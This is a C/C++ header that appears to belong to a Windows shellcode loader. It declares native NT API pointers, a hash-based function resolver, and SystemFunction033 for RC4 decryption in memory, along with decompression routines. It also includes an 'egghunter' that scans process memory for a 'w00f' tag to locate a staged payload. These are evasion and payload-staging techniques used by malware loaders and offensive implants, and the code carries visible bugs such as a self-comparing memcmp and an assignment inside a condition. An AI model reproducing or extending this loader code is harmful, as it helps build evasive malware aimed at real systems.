#pragma once
#ifdef _DEBUG
#include <stdio.h>
#endif


typedef int WINBOOL, * PWINBOOL, * LPWINBOOL;

#define COMPRESS_ALGORITHM_INVALID 0
#define COMPRESS_ALGORITHM_NULL 1
#define COMPRESS_ALGORITHM_MSZIP 2
#define COMPRESS_ALGORITHM_XPRESS 3
#define COMPRESS_ALGORITHM_XPRESS_HUFF 4
#define COMPRESS_ALGORITHM_LZMS 5
#define COMPRESS_ALGORITHM_MAX 6

#define COMPRESS_RAW (1 << 29)

DECLARE_HANDLE(COMPRESSOR_HANDLE);
typedef COMPRESSOR_HANDLE DECOMPRESSOR_HANDLE;
typedef COMPRESSOR_HANDLE* PDECOMPRESSOR_HANDLE;

typedef PVOID(__cdecl* PFN_COMPRESS_ALLOCATE) (PVOID UserContext, SIZE_T Size);
typedef VOID(__cdecl* PFN_COMPRESS_FREE) (PVOID UserContext, PVOID Memory);

typedef struct _COMPRESS_ALLOCATION_ROUTINES {
	PFN_COMPRESS_ALLOCATE Allocate;
	PFN_COMPRESS_FREE Free;
	PVOID UserContext;
} COMPRESS_ALLOCATION_ROUTINES, * PCOMPRESS_ALLOCATION_ROUTINES;

typedef NTSTATUS(NTAPI* _NtProtectVirtualMemory)(
	HANDLE Process,
	PVOID BaseAddress,
	PULONG NumberOfBytesToProtect,
	ULONG NewAccessProtection,
	PULONG OldAccessProtection
	);
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;

typedef enum _MEMORY_INFORMATION_CLASS {
	MemoryBasicInformation
} MEMORY_INFORMATION_CLASS;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_BASIC_INFORMATION {
	ULONG Reserved;
	ULONG TimerResolution;
	ULONG PageSize;
	ULONG NumberOfPhysicalPages;
	ULONG LowestPhysicalPageNumber;
	ULONG HighestPhysicalPageNumber;
	ULONG AllocationGranularity;
	ULONG_PTR MinimumUserModeAddress;
	ULONG_PTR MaximumUserModeAddress;
	KAFFINITY ActiveProcessorsAffinityMask;
	CHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION;

typedef NTSTATUS(NTAPI* _LdrLoadDll)(
	IN PWCHAR PathToFile OPTIONAL, 
	IN ULONG Flags OPTIONAL, 
	IN PUNICODE_STRING ModuleFileName, 
	OUT PHANDLE ModuleHandle);

typedef NTSTATUS(NTAPI* _NtWaitForSingleObject)(
	HANDLE         Handle,
	BOOLEAN        Alertable,
	PLARGE_INTEGER Timeout
);

typedef NTSTATUS(NTAPI* _NtReadVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	PVOID Buffer,
	ULONG NumberOfBytesToRead,
	PULONG NumberOfBytesReaded
	);

typedef NTSTATUS(NTAPI* _NtQueryVirtualMemory)(
	HANDLE                   ProcessHandle,
	PVOID                    BaseAddress,
	MEMORY_INFORMATION_CLASS MemoryInformationClass,
	PVOID                    MemoryInformation,
	SIZE_T                   MemoryInformationLength,
	PSIZE_T                  ReturnLength
	);

typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength);

// https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-headers/include/compressapi.h
typedef WINBOOL(WINAPI* _Decompress)(
	DECOMPRESSOR_HANDLE DecompressorHandle,
	PVOID CompressedData, 
	SIZE_T CompressedDataSize, 
	PVOID UncompressedBuffer, 
	SIZE_T UncompressedBufferSize, 
	PSIZE_T UncompressedDataSize);

typedef WINBOOL(WINAPI* _CloseDecompressor)(
	DECOMPRESSOR_HANDLE DecompressorHandle);

typedef WINBOOL(WINAPI* _CreateDecompressor)(
	DWORD Algorithm, 
	PCOMPRESS_ALLOCATION_ROUTINES AllocationRoutines, 
	PDECOMPRESSOR_HANDLE DecompressorHandle);

typedef NTSTATUS(WINAPI* _SystemFunction033)(
	struct ustring* memoryRegion,
	struct ustring* keyPointer);


struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	PUCHAR Buffer;
} _data, key;

_LdrLoadDll LdrLoadDll;
_Decompress Decompress;
_CreateDecompressor CreateDecompressor;
_CloseDecompressor CloseDecompressor;
_NtProtectVirtualMemory NtProtectVirtualMemory;
_NtWaitForSingleObject NtWaitForSingleObject;
_NtReadVirtualMemory NtReadVirtualMemory;
_SystemFunction033 SystemFunction033;
_NtQueryVirtualMemory NtQueryVirtualMemory;
_NtQuerySystemInformation NtQuerySystemInformation;

EXTERN_C char* _GetProcAddress(HANDLE ModuleHandle, DWORD FunctionHash);
EXTERN_C HMODULE _GetModuleHandleW(const wchar_t* ModuleName);
EXTERN_C char* CtrlFlow( char* Function);


HMODULE _LoadLibrary(wchar_t buffer[]) {
	HANDLE hLibrary;
	UNICODE_STRING Library;
	
	Library.Length = (wcslen(buffer) * 2);
	Library.MaximumLength = (wcslen(buffer) * 2) + 2;
	Library.Buffer = buffer;
	NTSTATUS status = LdrLoadDll(nullptr, 0, &Library, &hLibrary);
	if (!status) {
#ifdef _DEBUG
		printf("[+] Loaded library: %ls\r\n", buffer);
#endif 
	}
	else {
#ifdef _DEBUG
		printf("[-] Failed to load library: %ls\r\n", buffer);
#endif 
	}
	return (HMODULE)hLibrary;
}

EXTERN_C int mystrcmp(char* a, char* b) {
	while (*a == *b && *a) {
		a++;
		b++;
	}
	return (*a == *b);
}



void mymemcpy(char* dst, char* src, unsigned int size) {
	for (unsigned int i = 0; i < size; ++i) {
		dst[i] = src[i];
	}
}

void mymemset(char* dst, char c, unsigned int size) {
	for (unsigned int i = 0; i < size; ++i) {
		dst[i] = c;
	}
}

int mymemcmp(char* dst, char* src, unsigned int size) {
	for (unsigned int i = 0; i < size; ++i) {
		if (dst[i] != dst[i])
			return 0;
	}
	return 1;
}

char* egghunter() {
	
;		char* p = 0;
		char* buffer;
		char data[] = "w00f";
		int len = 4;
		
		
		SIZE_T rLength = 0;
		SIZE_T bytesRead;

		HANDLE process = (HANDLE)-1;
		SYSTEM_BASIC_INFORMATION  si = SYSTEM_BASIC_INFORMATION();
		MEMORY_INFORMATION_CLASS memclass = MEMORY_INFORMATION_CLASS();

		MEMORY_BASIC_INFORMATION meminfo;
	
		
		NTSTATUS status = NtQuerySystemInformation(SystemBasicInformation, &si, 64, (PULONG)&rLength);

		while (p < (char*)si.MaximumUserModeAddress)
		{
	
			NtQueryVirtualMemory((HANDLE)-1, p, MemoryBasicInformation, &meminfo, sizeof(meminfo), &rLength);
			if (meminfo.Type = 0x20000 && meminfo.State == 0x1000)
			{
				p = (char*)meminfo.BaseAddress;
				buffer = (char*)malloc(meminfo.RegionSize);
			
				if (!NtReadVirtualMemory(process, p, buffer, meminfo.RegionSize, (PULONG)&bytesRead))
				{
				
					for (size_t i = 0; i < (bytesRead-len); ++i)
						if (memcmp(&data, &buffer[i], len) == 0 ){
					
								if(memcmp(&data, &buffer[i + 4], len) == 0){
							
								free(buffer);
								return (char*)p + i + 8;
								}
					}
				}
				free(buffer);
			}
			p += meminfo.RegionSize;

		}
	
	return 0;
}
